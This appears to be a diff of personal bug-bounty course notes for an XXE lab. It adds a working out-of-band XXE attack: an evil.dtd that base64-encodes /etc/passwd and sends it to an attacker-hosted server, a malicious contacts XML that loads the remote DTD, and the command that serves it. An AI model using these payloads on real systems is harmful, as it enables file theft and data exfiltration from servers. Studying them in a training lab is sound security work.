@@ -42,10 +42,32 @@ This suggests that the XML is being processed in the backend, but we do not rece
 
 
 
-Now that we have confirmed the vulnerability and observed that it reaches out to our remote server using Burp Collaborator, we will proceed with an external DTD (Document Type Definition) attack.
+Now that we have confirmed the vulnerability and observed that it reaches out to our remote server using Burp Collaborator, 
+
+we will proceed with an external DTD (Document Type Definition) attack.  using this `evil.dtd` file :-
+```
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.240:8888/?x=%data;'>">
+
+```
 
 I am currently hosting this DTD file on my private server.
+```
+C:\home\kali\Documents\Obsidian Vault\Bug Bounty\Nahamsec intro to bug hunting\10 XML External Entity (XXE)> ls
+'001 XXE Slides.md'  'contacts(Lab 2).xml'       'evil(Lab 1).xml'
+'002 XXE Lab 01.md'  'Evil_contacts(Lab 2).xml'  'sitemap(Final_exploit_file)_Lab-1.xml'
+'003 XXE Lab 02.md'   evil.dtd                   'sitemap(lab 1).xml'
 
+
+
+##below command creates a private http server in folder where evil.dtd is present##
+
+C:\home\kali\Documents\Obsidian Vault\Bug Bounty\Nahamsec intro to bug hunting\10 XML External Entity (XXE)> python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+
+
+
+```
 Here's what happens:
 
 1. We retrieve the contents of `/etc/passwd` using the `file://` scheme.
@@ -55,8 +77,30 @@ Here's what happens:
 
 Encoding the file in Base64 ensures that we capture the entire content instead of just the first few lines. This also prevents the application from breaking the content due to newline characters.
 
-Now, let's modify our `contacts.xml` file.
+Now, let's modify our `contacts.xml` file  as .`Evil_contacts(Lab2).xml`
+```
+<?xml version="1.0" encoding="UTF-8"?>
 
+<!DOCTYPE contacts [
+  <!ENTITY % remote SYSTEM "http://192.168.0.240:8888/evil.dtd">
+  %remote;%param1;
+]>
+<contacts>
+    <contact>
+        <name>&exfil;</name>
+        <email>ben@test.com</email>
+    </contact>
+    <contact>
+        <name>adam</name>
+        <email>adam@test.com</email>
+    </contact>
+    <contact>
+        <name>test</name>
+        <email>test@test.com</email>
+    </contact>
+</contacts>
+
+```
 First, we replace the Burp Collaborator link with our private server's URL, which references the external DTD file.
 
 Next, we define XML entities that reference the external DTD.
@@ -70,7 +114,7 @@ We then ensure that the external DTD file properly executes system calls.
 
 To accomplish this, we append an ampersand (`&`) followed by a semicolon (`;`) to invoke the necessary functions.
 
-Now, we save the modified `contacts.xml` file and proceed to upload it.
+Now, we save the modified `Evil_contacts(Lab2).xml` file and proceed to upload it.
 
 Before submitting the file, we start an HTTP server to capture incoming requests.
 
